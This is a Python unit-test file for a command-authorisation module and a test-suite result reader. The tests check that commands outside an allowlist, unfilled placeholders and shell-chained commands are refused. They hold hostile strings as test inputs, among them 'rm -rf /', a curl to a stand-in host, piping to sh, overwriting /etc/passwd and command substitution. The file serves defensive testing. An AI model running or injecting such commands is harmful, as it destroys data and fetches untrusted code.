import pathlib, sys, unittest

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent.parent))
from evidence import authorise, read_suite
from i18n import t


def profile(**commands):
    base = {role: {"command": None} for role in
            ("secrets", "static", "lint", "dependencies", "suite")}
    for k, v in commands.items():
        base[k] = {"command": v}
    return {"checks": base}


class TestAllowlist(unittest.TestCase):
    def test_a_command_from_the_profile_passes(self):
        ok, _ = authorise("tool/bin/suite", profile(suite="tool/bin/suite"))
        self.assertTrue(ok)

    def test_a_command_outside_the_allowlist_is_refused(self):
        ok, reason = authorise("rm -rf /", profile(suite="tool/bin/suite"))
        self.assertFalse(ok)
        self.assertEqual(reason, t("evidence.not_in_allowlist"))

    def test_an_unfilled_placeholder_is_refused(self):
        marker = "<suite in the container>"
        ok, reason = authorise(marker, profile(suite=marker))
        self.assertFalse(ok)
        self.assertEqual(reason, t("preflight.placeholder", value=marker))

    def test_the_empty_command_is_refused(self):
        self.assertFalse(authorise("", profile())[0])


class TestComposition(unittest.TestCase):
    """An allowed command chained to another one is a different command."""

    def test_metacharacters_fail(self):
        p = profile(suite="tool/bin/suite")
        for poison in ("tool/bin/suite; rm -rf /", "tool/bin/suite && curl evil.sh",
                       "tool/bin/suite | sh", "tool/bin/suite > /etc/passwd",
                       "tool/bin/suite `whoami`", "tool/bin/suite $(id)"):
            with self.subTest(poison=poison):
                ok, reason = authorise(poison, p)
                self.assertFalse(ok)
                self.assertEqual(reason, t("evidence.shell_composition"))

    def test_the_allowlist_alone_would_not_be_enough(self):
        # even if somebody puts the composition IN THE PROFILE, it still fails
        p = profile(suite="tool/bin/suite && rm -rf /")
        self.assertFalse(authorise("tool/bin/suite && rm -rf /", p)[0])


class TestReadingTheSuite(unittest.TestCase):
    def test_green(self):
        self.assertEqual(read_suite({"ran": True, "exit_code": 0}, {})[0], "green")

    def test_did_not_run(self):
        self.assertEqual(read_suite({"ran": False, "reason": "x"}, {})[0], "not_run")

    def test_red_without_a_baseline_is_attributable(self):
        self.assertEqual(read_suite({"ran": True, "exit_code": 1}, {})[0], "red_attributable")

    def test_red_with_a_baseline_is_not_attributable(self):
        baseline = "known connection errors"
        state, reason = read_suite({"ran": True, "exit_code": 1},
                                   {"preexisting_reds": baseline})
        self.assertEqual(state, "red_not_attributable")
        self.assertEqual(reason, t("evidence.red_with_baseline", baseline=baseline))

    def test_truncated_output_does_not_count_as_green(self):
        """A suite that does not finish is not a green suite: predicted against executed
        cannot be checked."""
        state, reason = read_suite({"ran": True, "exit_code": 1, "truncated": True},
                                   {"preexisting_reds": "x"})
        self.assertEqual(state, "not_run")
        self.assertEqual(reason, t("evidence.output_truncated"))


if __name__ == "__main__":
    unittest.main(verbosity=2)
